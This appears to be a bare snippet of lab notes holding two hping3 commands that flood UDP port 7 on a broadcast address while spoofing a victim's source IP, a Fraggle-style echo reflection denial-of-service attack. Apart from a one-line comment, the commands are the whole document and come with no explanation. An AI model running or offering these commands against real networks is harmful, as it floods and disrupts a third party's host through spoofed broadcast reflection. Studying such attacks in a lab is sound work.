sudo hping3 -2 192.168.100.255 -a 192.168.100.2 -p 7 --flood

# ECHO REQUEST → ECHO RESPONSE
sudo hping3 -2 192.168.100.255 -a 192.168.100.2 -s 50001 -k -p 7 -d 2 --flood